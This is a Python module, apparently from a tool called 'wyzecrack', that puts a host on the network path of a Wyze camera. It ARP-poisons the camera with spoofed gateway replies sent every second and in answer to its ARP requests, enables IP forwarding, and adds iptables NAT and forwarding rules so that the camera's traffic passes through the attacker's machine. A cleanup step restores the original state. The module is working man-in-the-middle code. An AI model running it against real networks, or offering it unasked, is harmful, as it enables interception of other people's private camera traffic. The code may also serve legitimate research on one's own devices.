"""Getting on the camera's path (router mode)."""
import threading
from pathlib import Path

from . import rawnet
from .changes import run
from .netutil import default_gateway, ipt


class OnPath:
    """Make this host the camera's router: ARP-poison only the camera (we
    become its gateway) and MASQUERADE its traffic out under our address.

    Two-way poisoning (camera AND router) made the router route spoofed
    camera packets that it had also bridged from WiFi to our port with
    the identical 5-tuple; its fast path then sent them back to us with
    the camera's MAC (TTL -1 per bounce, a 25 us ping-pong) and kept doing
    so after the MITM stopped, black-holing that camera flow until the
    camera changed ports. In router mode the real router only ever routes
    our flows and its ARP table is untouched.

    The camera's existing connections survive the switch: its servers
    follow the new NAT mapping from its next keepalive, no reboot needed.

    poison=False skips the ARP step for hosts that already carry the
    camera's traffic (a gateway, or the netns lab).

    Every change goes through the Changes journal, so a crash is undone by
    `wyzecrack cleanup` or the next run."""

    def __init__(self, changes, cam_ip, iface, poison, gateway=None):
        self.changes = changes
        self.cam_ip, self.iface, self.poison = cam_ip, iface, poison
        self.gateway = gateway
        if poison and not gateway:
            self.gateway = default_gateway(iface)
            if not self.gateway:
                raise SystemExit(f"no default gateway on {iface}: the camera "
                                 f"must share this host's LAN and router")
        self.stop = threading.Event()
        self.threads = []
        self.tokens = []
        self.cam_mac = None

    def _rule(self, table, chain, *spec, insert=False):
        """Add an iptables rule unless an identical one exists, journaling
        its removal first."""
        if ipt("-t", table, "-C", chain, *spec).returncode == 0:
            return
        self.tokens.append(self.changes.add(
            "ipt", args=["-t", table, "-D", chain, *spec]))
        r = ipt("-t", table, "-I" if insert else "-A", chain,
                *(["1"] if insert else []), *spec)
        if r.returncode:
            raise SystemExit(f"iptables -t {table} {chain} failed: "
                             f"{r.stderr.strip()}")

    def start(self):
        c = self.changes
        # setting ip_forward rewrites every conf/*/forwarding and
        # conf/all/accept_redirects; journal them first so they are put
        # back after ip_forward is
        for p in [*sorted(Path("/proc/sys/net/ipv4/conf").glob("*/forwarding")),
                  Path("/proc/sys/net/ipv4/conf/all/accept_redirects")]:
            self.tokens.append(c.remember_sysctl(p))
        self.tokens.append(c.sysctl("/proc/sys/net/ipv4/ip_forward", 1))
        for dev in ("all", self.iface):
            # forwarding out the interface the packet came in on would
            # send the camera ICMP redirects naming the real gateway
            self.tokens.append(c.sysctl(
                f"/proc/sys/net/ipv4/conf/{dev}/send_redirects", 0))
        self._rule("nat", "POSTROUTING", "-s", self.cam_ip, "-o", self.iface,
                   "-j", "MASQUERADE")
        # firewalls that drop forwarded traffic by default (ufw, Docker,
        # firewalld) would black-hole the camera
        self._rule("filter", "FORWARD", "-s", self.cam_ip, "-j", "ACCEPT",
                   insert=True)
        self._rule("filter", "FORWARD", "-d", self.cam_ip, "-j", "ACCEPT",
                   insert=True)
        if self.poison:
            self._arp_start()
        print(f"[+] on-path: routing {self.cam_ip} through this host "
              f"({self.iface}{', ARP' if self.poison else ''})")

    def _arp_start(self):
        me = rawnet.mac_bytes(rawnet.iface_mac(self.iface))
        self.cam_mac = self._mac(self.cam_ip)
        cam_mac = rawnet.mac_bytes(self.cam_mac)
        gw_mac = rawnet.mac_bytes(self._mac(self.gateway))
        # unicast to the camera only: "the gateway is at our MAC"
        lie = rawnet.arp_reply(me, cam_mac, self.gateway, me,
                               self.cam_ip, cam_mac)
        # the restore carries the real gateway MAC in the ARP payload but
        # our own MAC as the Ethernet source: on Wi-Fi a frame whose source
        # is another station's MAC never makes it onto the air
        truth = rawnet.arp_reply(me, cam_mac, self.gateway, gw_mac,
                                 self.cam_ip, cam_mac)
        self.tokens.append(self.changes.add("arp", iface=self.iface,
                                            frame=truth.hex()))

        def send(frame):
            if self.stop.is_set():
                return
            try:
                with rawnet.open_raw(self.iface) as s:
                    s.send(frame)
            except OSError as e:     # link down across suspend/resume
                print(f"[!] ARP send failed ({e})")

        def tick():
            while not self.stop.is_set():
                send(lie)
                self.stop.wait(1.0)

        def answer():
            # win the race when the camera asks for its gateway
            def cb(p):
                if p.op == 1 and p.spa == self.cam_ip and p.tpa == self.gateway:
                    send(lie)
            while not self.stop.is_set():
                try:
                    rawnet.sniff(self.iface, rawnet.arp_filter(),
                                 rawnet.parse_arp, cb, self.stop.is_set)
                except OSError as e:  # suspend/resume
                    print(f"[!] ARP responder error ({e}); retrying")
                    self.stop.wait(2)

        for fn in (tick, answer):
            t = threading.Thread(target=fn, daemon=True)
            t.start()
            self.threads.append(t)

    def _mac(self, ip):
        mac = neighbor_mac(ip)
        if not mac:
            raise SystemExit(f"cannot resolve the MAC of {ip}: is it up and "
                             f"on {self.iface}'s LAN?")
        return mac

    def close(self):
        """Stop the ARP threads, then undo everything start() did."""
        if self.stop.is_set() or not self.tokens:
            self.stop.set()
            return
        print("[*] restoring the camera's route (ARP, NAT, sysctls)...")
        self.stop.set()
        for t in self.threads:
            t.join(2)
        self.changes.undo(self.tokens)
        self.tokens = []
        print("[+] on-path mode off")


def neighbor_mac(ip):
    """The MAC of an on-link host, pinging it first to fill the neighbor
    table, or None."""
    run(["ping", "-c", "1", "-W", "1", ip])
    out = run(["ip", "neigh", "show", ip]).stdout.split()
    if "lladdr" not in out:
        return None
    return out[out.index("lladdr") + 1].lower()
